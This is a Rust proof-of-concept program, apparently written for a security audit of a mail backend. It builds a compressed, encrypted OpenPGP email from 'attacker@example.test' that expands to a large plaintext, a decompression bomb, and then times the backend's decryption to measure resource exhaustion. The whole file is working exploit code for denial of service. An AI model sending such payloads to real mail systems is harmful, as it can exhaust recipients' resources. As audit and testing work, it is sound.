use base64::{engine::general_purpose::STANDARD, Engine};
use lizard_mail_backend::{
    AccountKind, Backend, BackendConfig, CredentialStoragePolicy, IngestMessage, MessageFilter,
    NewAccount, SecretValue,
};
use pgp::{
    composed::{
        EncryptionCaps, KeyType, MessageBuilder, SecretKeyParamsBuilder, SignedPublicKey,
        SignedSecretKey, SubkeyParamsBuilder,
    },
    crypto::sym::SymmetricKeyAlgorithm,
    ser::Serialize,
    types::{CompressionAlgorithm, KeyVersion},
};
use rand::thread_rng;
use std::{env, fs, path::Path};

#[tokio::main]
async fn main() {
    let args = env::args().collect::<Vec<_>>();
    let profile = Path::new(args.get(2).expect("profile path"));
    match args.get(1).map(String::as_str) {
        Some("generate") => generate(profile).await,
        Some("decrypt") => decrypt(profile).await,
        _ => panic!("usage: p1-openpgp-compression-bomb generate|decrypt PROFILE [MIB]"),
    }
}

fn config(profile: &Path) -> BackendConfig {
    let mut config = BackendConfig::new(profile);
    config.credential_storage = CredentialStoragePolicy::ProfileOnly;
    config
}

async fn generate(profile: &Path) {
    fs::create_dir_all(profile).unwrap();
    let backend = Backend::open(config(profile)).await.unwrap();
    let account = backend
        .accounts()
        .add(NewAccount {
            name: "Victim".into(),
            kind: AccountKind::Local,
            credential_ref: None,
            imap: None,
        })
        .await
        .unwrap();

    let params = SecretKeyParamsBuilder::default()
        .version(KeyVersion::V6)
        .key_type(KeyType::Ed25519)
        .can_certify(true)
        .can_sign(true)
        .primary_user_id("Victim <victim@example.test>".to_owned())
        .passphrase(None)
        .subkey(
            SubkeyParamsBuilder::default()
                .version(KeyVersion::V6)
                .key_type(KeyType::X25519)
                .can_encrypt(EncryptionCaps::All)
                .passphrase(None)
                .build()
                .unwrap(),
        )
        .build()
        .unwrap();
    let mut rng = thread_rng();
    let secret: SignedSecretKey = params.generate(&mut rng).unwrap();
    let public = SignedPublicKey::from(secret.clone());
    let mut secret_bytes = Vec::new();
    secret.to_writer(&mut secret_bytes).unwrap();
    backend
        .openpgp()
        .import_software_secret_key(account.id, secret_bytes, SecretValue::new(""))
        .await
        .unwrap();

    let mib = args_mib();
    let mut entity = b"Content-Type: text/plain; charset=utf-8\r\n\r\n".to_vec();
    entity.resize(mib * 1024 * 1024, b'A');
    let mut builder =
        MessageBuilder::from_bytes("", entity).seipd_v1(&mut rng, SymmetricKeyAlgorithm::AES256);
    builder.compression(CompressionAlgorithm::ZLIB);
    builder
        .encrypt_to_key(&mut rng, &public.public_subkeys[0])
        .unwrap();
    let encrypted = builder.to_vec(&mut rng).unwrap();

    let boundary = "audit-openpgp-boundary";
    let encoded = STANDARD.encode(&encrypted);
    let mut raw = format!(
        "From: attacker@example.test\r\nTo: victim@example.test\r\nSubject: compressed payload\r\nMessage-ID: <openpgp-bomb@example.test>\r\nMIME-Version: 1.0\r\nContent-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=\"{boundary}\"\r\n\r\n--{boundary}\r\nContent-Type: application/pgp-encrypted\r\n\r\nVersion: 1\r\n--{boundary}\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: base64\r\n\r\n"
    )
    .into_bytes();
    for chunk in encoded.as_bytes().chunks(76) {
        raw.extend_from_slice(chunk);
        raw.extend_from_slice(b"\r\n");
    }
    raw.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
    let outer_size = raw.len();
    let encrypted_size = encrypted.len();
    let id = backend
        .messages()
        .ingest(IngestMessage::local(raw))
        .await
        .unwrap();
    println!("plaintext_bytes={}", mib * 1024 * 1024);
    println!("encrypted_bytes={encrypted_size}");
    println!("outer_message_bytes={outer_size}");
    println!("message_id={id}");
}

fn args_mib() -> usize {
    env::args()
        .nth(3)
        .and_then(|value| value.parse::<usize>().ok())
        .unwrap_or(128)
}

async fn decrypt(profile: &Path) {
    let backend = Backend::open(config(profile)).await.unwrap();
    let page = backend
        .messages()
        .list(MessageFilter::default())
        .await
        .unwrap();
    let id = page.items.first().expect("ingested message").id;
    let started = std::time::Instant::now();
    let result = backend.openpgp().decrypt_message(id).await;
    println!("elapsed_ms={}", started.elapsed().as_millis());
    match result {
        Ok(message) => println!("result=ok body_text_bytes={}", message.body_text.len()),
        Err(error) => println!("result=error {error}"),
    }
}
